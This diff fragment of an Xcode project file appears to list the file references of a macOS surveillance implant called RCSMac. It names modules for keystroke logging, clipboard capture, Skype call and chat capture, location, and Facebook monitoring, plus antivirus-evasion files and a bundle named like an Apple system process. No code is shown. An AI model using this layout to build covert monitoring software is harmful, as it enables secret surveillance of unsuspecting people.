+		1AB5DC4011CF9DE600B9E32B /* NSApplication+SystemVersion.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSApplication+SystemVersion.m"; path = "Categories/NSApplication+SystemVersion.m"; sourceTree = "<group>"; };
+		1ABE7CDD0F7BA0A800BC61B1 /* RCSMSharedMemory.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMSharedMemory.h; path = Support/RCSMSharedMemory.h; sourceTree = "<group>"; };
+		1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMSharedMemory.m; path = Support/RCSMSharedMemory.m; sourceTree = "<group>"; };
+		1ABE7E790F7CE6ED00BC61B1 /* RCSMUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMUtils.h; path = Support/RCSMUtils.h; sourceTree = "<group>"; };
+		1ABE7E7A0F7CE6ED00BC61B1 /* RCSMUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMUtils.m; path = Support/RCSMUtils.m; sourceTree = "<group>"; };
+		1ABEEE2C0F975CE100063113 /* RCSMCore.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMCore.h; sourceTree = "<group>"; };
+		1ABEEE2D0F975CE100063113 /* RCSMCore.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSMCore.m; sourceTree = "<group>"; };
+		1AC279A613584222009C0812 /* RCSMAgentIMMsnMessenger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentIMMsnMessenger.h; path = Agents/RCSMAgentIMMsnMessenger.h; sourceTree = "<group>"; };
+		1AC279A713584222009C0812 /* RCSMAgentIMMsnMessenger.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentIMMsnMessenger.m; path = Agents/RCSMAgentIMMsnMessenger.m; sourceTree = "<group>"; };
+		1AD1D6C71099EBAF005B548F /* QuartzCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = QuartzCore.framework; path = System/Library/Frameworks/QuartzCore.framework; sourceTree = SDKROOT; };
+		1AD4328712A3E3CF00B472C3 /* AddressBook.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AddressBook.framework; path = System/Library/Frameworks/AddressBook.framework; sourceTree = SDKROOT; };
+		1ADC5D8412DDBEA600650A1E /* NetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = NetworkOperation.h; path = Modules/NetworkOperation.h; sourceTree = "<group>"; };
+		1ADC5D8712DDBEB800650A1E /* NetworkProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = NetworkProtocol.h; path = Modules/NetworkProtocol.h; sourceTree = "<group>"; };
+		1ADC5D9412DDBF2100650A1E /* RESTNetworkProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RESTNetworkProtocol.h; path = Modules/RESTNetworkProtocol.h; sourceTree = "<group>"; };
+		1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTNetworkProtocol.m; path = Modules/RESTNetworkProtocol.m; sourceTree = "<group>"; };
+		1AEB953F138E94480057EB42 /* RCSMInfoManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMInfoManager.h; path = Modules/RCSMInfoManager.h; sourceTree = "<group>"; };
+		1AEB9540138E94480057EB42 /* RCSMInfoManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMInfoManager.m; path = Modules/RCSMInfoManager.m; sourceTree = "<group>"; };
+		1AF15F1711DC8E0100637F4E /* AppKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AppKit.framework; path = System/Library/Frameworks/AppKit.framework; sourceTree = SDKROOT; };
+		1AF6069E12EDAEA90091F6F6 /* ByeNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ByeNetworkOperationTest.m; path = Tests/ByeNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF6072712EDCAC30091F6F6 /* NSMutableData+SHA1.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSMutableData+SHA1.h"; path = "Categories/NSMutableData+SHA1.h"; sourceTree = "<group>"; };
+		1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableData+SHA1.m"; path = "Categories/NSMutableData+SHA1.m"; sourceTree = "<group>"; };
+		1AF6074912EDD5A70091F6F6 /* IDNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = IDNetworkOperationTest.m; path = Tests/IDNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF6077912EDE2160091F6F6 /* NSString+Pascal.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSString+Pascal.h"; path = "Categories/NSString+Pascal.h"; sourceTree = "<group>"; };
+		1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSString+Pascal.m"; path = "Categories/NSString+Pascal.m"; sourceTree = "<group>"; };
+		1AF607A012EED0A40091F6F6 /* NSString+PascalTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSString+PascalTest.m"; path = "Tests/NSString+PascalTest.m"; sourceTree = "<group>"; };
+		1AF608B512EF0E310091F6F6 /* ConfNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ConfNetworkOperationTest.m; path = Tests/ConfNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF60BE312EF27B50091F6F6 /* DownloadNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = DownloadNetworkOperationTest.m; path = Tests/DownloadNetworkOperationTest.m; sourceTree = "<group>"; };
+		1AF60C0212EF2B880091F6F6 /* NSData+Pascal.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSData+Pascal.h"; path = "Categories/NSData+Pascal.h"; sourceTree = "<group>"; };
+		1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSData+Pascal.m"; path = "Categories/NSData+Pascal.m"; sourceTree = "<group>"; };
+		1AF60C0D12EF2CC10091F6F6 /* NSData+PascalTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSData+PascalTest.m"; path = "Tests/NSData+PascalTest.m"; sourceTree = "<group>"; };
+		1AF60C4112F028A00091F6F6 /* OCMock.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = OCMock.framework; path = Library/Frameworks/OCMock.framework; sourceTree = SDKROOT; };
+		1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RCSMInputManager.bundle; sourceTree = BUILT_PRODUCTS_DIR; };
+		1AF6100A0FA72D87003F2C12 /* RCSMInputManager-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "RCSMInputManager-Info.plist"; sourceTree = "<group>"; };
+		1AF92B700F8F4A90009ED774 /* RCSMTaskManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMTaskManager.h; path = Modules/RCSMTaskManager.h; sourceTree = "<group>"; };
+		1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMTaskManager.m; path = Modules/RCSMTaskManager.m; sourceTree = "<group>"; };
+		1AF92CB00F947D53009ED774 /* spref.tiff */ = {isa = PBXFileReference; lastKnownFileType = image.tiff; path = spref.tiff; sourceTree = "<group>"; };
+		1AF92CC50F947FEE009ED774 /* Security.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Security.framework; path = /System/Library/Frameworks/Security.framework; sourceTree = "<absolute>"; };
+		1AFBE66312A0082600BFA7D0 /* RCSMAgentOrganizer.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentOrganizer.h; path = Agents/RCSMAgentOrganizer.h; sourceTree = "<group>"; };
+		1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentOrganizer.m; path = Agents/RCSMAgentOrganizer.m; sourceTree = "<group>"; };
+		29B97316FDCFA39411CA2CEA /* RCSMMain.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSMMain.m; sourceTree = "<group>"; };
+		29B97325FDCFA39411CA2CEA /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = /System/Library/Frameworks/Foundation.framework; sourceTree = "<absolute>"; };
+		32CA4F630368D1EE00C91783 /* RCSMac_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMac_Prefix.pch; sourceTree = "<group>"; };
+		520F50A41529FD920083B11E /* RCSMAgentIMAdium.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentIMAdium.h; path = Agents/RCSMAgentIMAdium.h; sourceTree = "<group>"; };
+		520F50A51529FD920083B11E /* RCSMAgentIMAdium.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentIMAdium.m; path = Agents/RCSMAgentIMAdium.m; sourceTree = "<group>"; };
+		520FE2131265E20B00F31B58 /* RCSMOsaxFiles.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMOsaxFiles.h; sourceTree = "<group>"; };
+		521ABB39132F9FDF00DC54A8 /* Apple80211 */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = Apple80211; path = System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Apple80211; sourceTree = SDKROOT; };
+		521ABB3B132FA01B00DC54A8 /* SystemConfiguration.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SystemConfiguration.framework; path = System/Library/Frameworks/SystemConfiguration.framework; sourceTree = SDKROOT; };
+		521B22C41312BA360077A491 /* RCSMAgentPosition.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentPosition.h; path = Agents/RCSMAgentPosition.h; sourceTree = "<group>"; };
+		521B22C51312BA360077A491 /* RCSMAgentPosition.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentPosition.m; path = Agents/RCSMAgentPosition.m; sourceTree = "<group>"; };
+		521DA5FD125C884000A3D49E /* ScriptingBridge.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ScriptingBridge.framework; path = System/Library/Frameworks/ScriptingBridge.framework; sourceTree = SDKROOT; };
+		5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentClipboard.h; path = Agents/RCSMAgentClipboard.h; sourceTree = "<group>"; };
+		5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentClipboard.m; path = Agents/RCSMAgentClipboard.m; sourceTree = "<group>"; };
+		5262A92D132A5A2C001D1988 /* RCSMAgentIMSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentIMSkype.h; path = Agents/RCSMAgentIMSkype.h; sourceTree = "<group>"; };
+		5262A92E132A5A2C001D1988 /* RCSMAgentIMSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentIMSkype.m; path = Agents/RCSMAgentIMSkype.m; sourceTree = "<group>"; };
+		5262A92F132A5A2C001D1988 /* RCSMAgentInputLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentInputLogger.h; path = Agents/RCSMAgentInputLogger.h; sourceTree = "<group>"; };
+		5262A930132A5A2C001D1988 /* RCSMAgentInputLogger.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentInputLogger.m; path = Agents/RCSMAgentInputLogger.m; sourceTree = "<group>"; };
+		5262A937132A5A2C001D1988 /* RCSMAgentURL.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentURL.h; path = Agents/RCSMAgentURL.h; sourceTree = "<group>"; };
+		5262A938132A5A2C001D1988 /* RCSMAgentURL.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentURL.m; path = Agents/RCSMAgentURL.m; sourceTree = "<group>"; };
+		5262A939132A5A2C001D1988 /* RCSMAgentVoipSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentVoipSkype.h; path = Agents/RCSMAgentVoipSkype.h; sourceTree = "<group>"; };
+		5262A93A132A5A2C001D1988 /* RCSMAgentVoipSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentVoipSkype.m; path = Agents/RCSMAgentVoipSkype.m; sourceTree = "<group>"; };
+		5262A946132A5AB4001D1988 /* RCSMAgentDevice.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentDevice.h; path = Agents/RCSMAgentDevice.h; sourceTree = "<group>"; };
+		5262A947132A5AB4001D1988 /* RCSMAgentDevice.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentDevice.m; path = Agents/RCSMAgentDevice.m; sourceTree = "<group>"; };
+		5269F6211330ED7200644B72 /* RCSMAgentApplication.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentApplication.h; path = Agents/RCSMAgentApplication.h; sourceTree = "<group>"; };
+		5269F6221330ED7200644B72 /* RCSMAgentApplication.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentApplication.m; path = Agents/RCSMAgentApplication.m; sourceTree = "<group>"; };
+		5276E4C613155100005155B8 /* CoreWLAN.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreWLAN.framework; path = SDKs/MacOSX10.6.sdk/System/Library/Frameworks/CoreWLAN.framework; sourceTree = DEVELOPER_DIR; };
+		529A87B814C4257100411539 /* RCSMDiskQuota.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMDiskQuota.h; path = Support/RCSMDiskQuota.h; sourceTree = "<group>"; };
+		529A87B914C4257100411539 /* RCSMDiskQuota.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMDiskQuota.m; path = Support/RCSMDiskQuota.m; sourceTree = "<group>"; };
+		529CA8A51464304100B92C47 /* com.apple.mdworker_server.xpc */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = com.apple.mdworker_server.xpc; sourceTree = BUILT_PRODUCTS_DIR; };
+		529CA8A81464304100B92C47 /* mdworker_server-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "mdworker_server-Info.plist"; sourceTree = "<group>"; };
+		529CA8AA1464304100B92C47 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/InfoPlist.strings; sourceTree = "<group>"; };
+		529CA8AC1464304100B92C47 /* mdworker_server-Prefix.pch */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "mdworker_server-Prefix.pch"; sourceTree = "<group>"; };
+		529CA8AD1464304100B92C47 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		529CA8B2146430DF00B92C47 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = SDKs/MacOSX10.7.sdk/System/Library/Frameworks/Foundation.framework; sourceTree = DEVELOPER_DIR; };
+		52B8502515146D4E00F0D72E /* JSON.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = JSON.h; sourceTree = "<group>"; };
+		52B8502615146D4E00F0D72E /* NSObject+SBJson.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSObject+SBJson.h"; sourceTree = "<group>"; };
+		52B8502715146D4E00F0D72E /* NSObject+SBJson.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSObject+SBJson.m"; sourceTree = "<group>"; };
+		52B8502815146D4E00F0D72E /* RCSIJSonConfiguration.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSIJSonConfiguration.h; sourceTree = "<group>"; };
+		52B8502915146D4E00F0D72E /* RCSIJSonConfiguration.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIJSonConfiguration.m; sourceTree = "<group>"; };
+		52B8502A15146D4E00F0D72E /* SBJson.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJson.h; sourceTree = "<group>"; };
+		52B8502B15146D4E00F0D72E /* SBJsonParser.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonParser.h; sourceTree = "<group>"; };
+		52B8502C15146D4E00F0D72E /* SBJsonParser.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonParser.m; sourceTree = "<group>"; };
+		52B8502D15146D4E00F0D72E /* SBJsonStreamParser.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamParser.h; sourceTree = "<group>"; };
+		52B8502E15146D4E00F0D72E /* SBJsonStreamParser.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamParser.m; sourceTree = "<group>"; };
+		52B8502F15146D4E00F0D72E /* SBJsonStreamParserAccumulator.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamParserAccumulator.h; sourceTree = "<group>"; };
+		52B8503015146D4E00F0D72E /* SBJsonStreamParserAccumulator.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamParserAccumulator.m; sourceTree = "<group>"; };
+		52B8503115146D4E00F0D72E /* SBJsonStreamParserAdapter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamParserAdapter.h; sourceTree = "<group>"; };
+		52B8503215146D4E00F0D72E /* SBJsonStreamParserAdapter.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamParserAdapter.m; sourceTree = "<group>"; };
+		52B8503315146D4E00F0D72E /* SBJsonStreamParserState.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamParserState.h; sourceTree = "<group>"; };
+		52B8503415146D4E00F0D72E /* SBJsonStreamParserState.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamParserState.m; sourceTree = "<group>"; };
+		52B8503515146D4E00F0D72E /* SBJsonStreamWriter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamWriter.h; sourceTree = "<group>"; };
+		52B8503615146D4E00F0D72E /* SBJsonStreamWriter.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamWriter.m; sourceTree = "<group>"; };
+		52B8503715146D4E00F0D72E /* SBJsonStreamWriterAccumulator.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamWriterAccumulator.h; sourceTree = "<group>"; };
+		52B8503815146D4E00F0D72E /* SBJsonStreamWriterAccumulator.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamWriterAccumulator.m; sourceTree = "<group>"; };
+		52B8503915146D4E00F0D72E /* SBJsonStreamWriterState.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonStreamWriterState.h; sourceTree = "<group>"; };
+		52B8503A15146D4E00F0D72E /* SBJsonStreamWriterState.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonStreamWriterState.m; sourceTree = "<group>"; };
+		52B8503B15146D4E00F0D72E /* SBJsonTokeniser.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonTokeniser.h; sourceTree = "<group>"; };
+		52B8503C15146D4E00F0D72E /* SBJsonTokeniser.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonTokeniser.m; sourceTree = "<group>"; };
+		52B8503D15146D4E00F0D72E /* SBJsonUTF8Stream.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonUTF8Stream.h; sourceTree = "<group>"; };
+		52B8503E15146D4E00F0D72E /* SBJsonUTF8Stream.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonUTF8Stream.m; sourceTree = "<group>"; };
+		52B8503F15146D4E00F0D72E /* SBJsonWriter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SBJsonWriter.h; sourceTree = "<group>"; };
+		52B8504015146D4E00F0D72E /* SBJsonWriter.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SBJsonWriter.m; sourceTree = "<group>"; };
+		52D8361C1393915B00C18E70 /* libFFurlLib32.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libFFurlLib32.a; path = Support/Firefox/libFFurlLib32.a; sourceTree = "<group>"; };
+		52D8361D1393915B00C18E70 /* libFFurlLib64.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libFFurlLib64.a; path = Support/Firefox/libFFurlLib64.a; sourceTree = "<group>"; };
+		52D836211393916B00C18E70 /* libmozalloc.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libmozalloc.dylib; path = Support/Firefox/lib/libmozalloc.dylib; sourceTree = "<group>"; };
+		52D836221393916B00C18E70 /* libnspr4.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libnspr4.dylib; path = Support/Firefox/lib/libnspr4.dylib; sourceTree = "<group>"; };
+		52D836231393916B00C18E70 /* libxpcom.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libxpcom.dylib; path = Support/Firefox/lib/libxpcom.dylib; sourceTree = "<group>"; };
+		52D836241393916B00C18E70 /* libxpcomglue_s.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libxpcomglue_s.a; path = Support/Firefox/lib/libxpcomglue_s.a; sourceTree = "<group>"; };
+		8D1107310486CEB800E47090 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		8D1107320486CEB800E47090 /* RCSMac.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RCSMac.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		C52FEF3F16FC596200DCBF2A /* __m_Social_Module.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social_Module.h; path = Agents/Social/__m_Social_Module.h; sourceTree = "<group>"; };
+		C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social_Module.m; path = Agents/Social/__m_Social_Module.m; sourceTree = "<group>"; };
+		C52FEF4316FC59C900DCBF2A /* __m_Social.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social.h; path = Agents/Social/__m_Social.h; sourceTree = "<group>"; };
+		C52FEF4416FC59C900DCBF2A /* __m_Social.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social.m; path = Agents/Social/__m_Social.m; sourceTree = "<group>"; };
+		C52FEF4616FC5A0E00DCBF2A /* __m_Social_Facebook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social_Facebook.h; path = Agents/Social/Facebook/__m_Social_Facebook.h; sourceTree = "<group>"; };
+		C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social_Facebook.m; path = Agents/Social/Facebook/__m_Social_Facebook.m; sourceTree = "<group>"; };
+		C52FEF4916FC5A5A00DCBF2A /* social.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = social.h; path = Agents/Social/social.h; sourceTree = "<group>"; };
+		CC27338016B7D1D100DCD0E4 /* CommandsNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = CommandsNetworkOperation.h; path = Modules/CommandsNetworkOperation.h; sourceTree = "<group>"; };
+		CC27338116B7D1D100DCD0E4 /* CommandsNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = CommandsNetworkOperation.m; path = Modules/CommandsNetworkOperation.m; sourceTree = "<group>"; };
+		CC31C80E16DCB5FB00922BD6 /* RCSMTask.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMTask.h; path = Support/RCSMTask.h; sourceTree = "<group>"; };
+		CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMTask.m; path = Support/RCSMTask.m; sourceTree = "<group>"; };
+		CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libsqlite3.dylib; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.6.sdk/usr/lib/libsqlite3.dylib; sourceTree = DEVELOPER_DIR; };
+		CC7ED16515C95CB100F90517 /* RCSMAVGarbage.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAVGarbage.h; path = Support/RCSMAVGarbage.h; sourceTree = "<group>"; };
+		CCCBE263183CFEEB00F626A3 /* RCSMInputmanager_aes.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMInputmanager_aes.h; path = Modules/RCSMInputmanager_aes.h; sourceTree = "<group>"; };
+		CCD43B5A18EC00AC005B2B67 /* RCSMAgentMessages.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentMessages.h; path = Agents/RCSMAgentMessages.h; sourceTree = "<group>"; };
+		CCD43B5B18EC00AC005B2B67 /* RCSMAgentMessages.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentMessages.m; path = Agents/RCSMAgentMessages.m; sourceTree = "<group>"; };
+		CCD43B5D18EC00C6005B2B67 /* RCSNativeMail.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSNativeMail.h; path = Support/RCSNativeMail.h; sourceTree = "<group>"; };
+		CCE74A7E185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSProcessInfo+NSProcessInfo__AVEvasion_.h"; path = "Categories/NSProcessInfo+NSProcessInfo__AVEvasion_.h"; sourceTree = "<group>"; };
